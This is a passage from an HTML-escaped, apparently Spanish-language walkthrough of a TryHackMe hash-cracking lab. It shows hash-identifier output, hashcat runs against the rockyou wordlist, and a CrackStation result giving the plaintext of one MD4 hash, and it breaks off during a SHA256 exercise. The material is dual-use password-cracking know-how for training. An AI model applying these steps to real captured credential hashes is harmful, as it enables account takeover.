&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; HASH: 279412f945939ba78ce0758d3fd83daa

Possible Hashs:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD5
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Domain Cached Credentials - MD4&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;MD4&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;strtolower&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;

Least Possible Hashs:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  RAdmin v2.x
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  NTLM
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD4
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD2
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD4&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD2&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Wordpress&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Haval-128
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Haval-128&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  RipeMD-128
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  RipeMD-128&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SNEFRU-128
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SNEFRU-128&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Tiger-128
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Tiger-128&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;.0.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;.LF.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;strtoupper&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;

   -------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;hashcat-4&#34;&gt;HASHCAT&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;./hashcat64.bin -m &lt;span class=&#34;m&#34;&gt;900&lt;/span&gt; hash.txt rockyou.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;crackstation-3&#34;&gt;CrackStation&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/hashes/Screenshot%20from%202019-09-05%2022.03.41.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Crackeada:&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;Eternity22:279412f945939ba78ce0758d3fd83daa&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;nivel-2&#34;&gt;NIVEL 2&lt;/h1&gt;
&lt;h3 id=&#34;1-sha256&#34;&gt;#1 SHA256&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Hash:&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;F09EDCB1FCEFC6DFB23DC3505A882655FF77375ED8AA2D1C13F640FCCC2D0C85&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;hashidentifier-4&#34;&gt;HASHIDENTIFIER&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; HASH: F09EDCB1FCEFC6DFB23DC3505A882655FF77375ED8AA2D1C13F640FCCC2D0C85

Possible Hashs:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SHA-256
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Haval-256

Least Possible Hashs:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  GOST R 34.11-94
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  RipeMD-256
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SNEFRU-256
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SHA-256&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Haval-256&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  RipeMD-256&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SNEFRU-256&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SHA-256&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SHA-256&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;

   -------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;hashcat-5&#34;&gt;HASHCAT&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@tars:~/tools/hashcat$ ./hashcat64.bin -m &lt;span class=&#34;m&#34;&gt;1400&lt;/span&gt; hash.txt ../rockyou.txt
hashcat &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v5.1.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting...

* Device &lt;span class=&#34;c1&#34;&gt;#1: WARNING! Kernel exec timeout is not disabled.&lt;/span&gt;
             This may cause &lt;span class=&#34;s2&#34;&gt;&amp;#34;CL_OUT_OF_RESOURCES&amp;#34;&lt;/span&gt; or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;: Not Supported

OpenCL Platform &lt;span class=&#34;c1&#34;&gt;#1: NVIDIA Corporation&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;======================================&lt;/span&gt;
* Device &lt;span class=&#34;c1&#34;&gt;#1: GeForce MX130, 501/2004 MB allocatable, 3MCU&lt;/span&gt;

